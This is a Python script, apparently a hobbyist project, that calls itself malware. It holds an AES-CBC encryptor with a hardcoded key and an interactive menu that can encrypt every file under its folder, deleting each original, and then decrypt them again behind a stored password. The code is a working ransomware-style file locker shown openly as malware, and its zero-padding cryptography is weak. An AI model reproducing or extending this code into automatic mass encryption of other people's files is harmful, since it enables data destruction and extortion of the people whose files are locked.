#!C:\Users\Benedicto\AppData\Local\Programs\Python\Python39

from Crypto import Random     # pip install pycryptodome
from Crypto.Cipher import AES
from tqdm import tqdm, tqdm_gui
from time import sleep
#from Crypto.PublicKey import RSA
#import base64
import os
import os.path
from os import listdir
from os.path import isfile, join
import time

class Encryptor:
    def __init__(self, key):
        self.key = key

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

    def encrypt_file(self, file_name):
        with open(file_name, 'rb') as fo:
            plaintext = fo.read()
        enc = self.encrypt(plaintext, self.key)
        with open(file_name + ".enc", 'wb') as fo:
            fo.write(enc)
        os.remove(file_name)

    def decrypt(self, ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")


    def decrypt_file(self, file_name):
        with open(file_name, 'rb') as fo:
            ciphertext = fo.read()
        dec = self.decrypt(ciphertext, self.key)
        with open(file_name[:-4], 'wb') as fo:
            fo.write(dec)
        os.remove(file_name)

    def getAllFiles(self):
        dir_path = os.path.dirname(os.path.realpath(__file__))
        dirs = []
        for dirName, subdirList, fileList in os.walk(dir_path):
            for fname in fileList:
                if (fname != 'script.py' and fname != 'data.txt.enc'):
                    dirs.append(dirName + "\\" + fname)
        return dirs

    def encrypt_all_files(self):
        dirs = self.getAllFiles()
        for file_name in dirs:
            self.encrypt_file(file_name)

    def decrypt_all_files(self):
        dirs = self.getAllFiles()
        for file_name in dirs:
            self.decrypt_file(file_name)


key = b'[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e'
enc = Encryptor(key)
clear = lambda: os.system('cls')

if os.path.isfile('data.txt.enc'):
    while True:
        print("=================================================")
        password = str(input("Enter password: "))
        enc.decrypt_file("data.txt.enc")
        p = ''
        with open("data.txt", "r") as f:
            p = f.readlines()
        if p[0] == password:
            enc.encrypt_file("data.txt")
            break   

    while True:
        clear()
        choices = int(input(
            "\n===========WELCOME, HACKER!============== \n1.| Type '1' to encrypt a file in the directory.\n=========================================\n2.| Type '2' to decrypt a file in the directory.\n=========================================\n3.| Type '3' to Encrypt all files in the directory.\n=========================================\n4.| Type '4' to decrypt all files in the directory.\n=========================================\n5.| Type '5' to Exit.\n=========================================\n| Enter No. = "))
        clear()
        if choices == 1:
            enc.encrypt_file(str(input("Enter the name of file to encrypt it: ")))
            for i in tqdm(range(5), desc="Loading", colour="red"):
                sleep(.1)
            print("=================================================")
            print('Encrypted!')
            print("=================================================")
            input('Press Enter to Continue...')
        elif choices == 2:
            enc.decrypt_file(str(input("Enter the name of file to decrypt it: ")))
            for i in tqdm(range(3), desc="Loading", colour="green"):
                sleep(.1)
            print("=================================================")
            print('Decrypted!')
            print("=================================================")
            input('Press Enter to Continue...')            
        elif choices == 3:
            enc.encrypt_all_files()
            for i in tqdm(range(20), desc="Loading", colour="red"):
                sleep(.1)
            print("=================================================")
            print('All Files in the directory are encrypted!')
            print("=================================================")
            input('Press Enter to Continue...')              
        elif choices == 4:
            enc.decrypt_all_files()
            for i in tqdm(range(15), desc="Loading", colour="green"):
                sleep(.1)
            print("=================================================")
            print('All files in the directory are Decrypted!')
            print("=================================================")
            input('Press Enter to Continue...')              
        elif choices == 5:
            print("=================================================")
            print(' = = = = = = = = = = = BYE! = = = = = = = = = = =')
            print("=================================================")
            exit()
        else:
            print("Please select a VALID option!!")

else:
    while True:
        clear()
        print("=================================================")
        print("Welcome to my Malware! xD                     ")
        print("-------------------------------------------------")
        print("Creator: Jory                                    ")
        print("=================================================")
        welcome = str(input("Press Enter to continue..."))
        print("====================WELCOME======================")
        password = str(input("Enter a password that will be used for Encryption\Decryption:\nPassword: "))
        print("=================================================")
        repassword = str(input("Confirm password: "))
        print("=================================================")
        for i in tqdm(range(10), desc="Loading", colour="red"):
            sleep(.1)
        print("================================================")
        print("Load Success!")
        print("================================================")
        if password == repassword:
            break
        else:
            print("Passwords unmatched!")
    f = open("data.txt", "w+")
    f.write(password)
    f.close()
    enc.encrypt_file("data.txt")
    print("Please restart the program!")
    print("================================================")
    input('Press ENTER to exit!')
    time.sleep(1)
